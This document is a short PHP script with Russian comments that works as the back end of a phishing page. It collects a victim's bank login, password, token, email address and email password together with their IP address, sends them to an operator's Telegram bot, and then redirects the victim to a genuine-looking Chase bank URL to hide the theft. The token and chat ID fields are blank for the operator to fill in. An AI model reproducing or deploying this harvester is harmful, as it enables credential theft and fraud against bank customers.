<?php header('Content-type: text/html; charset=utf-8'); // задаем кодировку

$serv = $_GET['page'];

$token=''; // ваш токен телеграм
$chat_id=''; // ваш id телеграм


if ($serv == '1') {

if (!empty($_POST['login']) && (!empty($_POST['password']))) { //проверяем поля на пустоту
$ip = 'IP: ' .$_SERVER['REMOTE_ADDR'];
$login = 'Login: '.$_POST['login']; // получаем данные из формы
$password='Password: ' .$_POST['password']; // получаем данные из формы
$Usertoken='Token (если есть): ' .$_POST['Usertoken']; // получаем данные из формы
$email = 'Email: '.$_POST['email']; // получаем данные из формы
$Emailpassword='Email Password: ' .$_POST['Emailpassword']; // получаем данные из формы

$message=$login."\r\n". htmlentities($password); // формируем сообщение
if (isset ($token) && ($chat_id)) {
$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text=%0A----------------------------------%0A$ip%0A%0A$login%0A$password%0A$Usertoken%0A%0A$email%0A$Emailpassword%0A----------------------------------%0A","r"); // отправка данных c формы в телеграм
}
header("Location: https://secure05ea.chase.com/web/auth/dashboard#/dashboard/index/index");
}
}
?>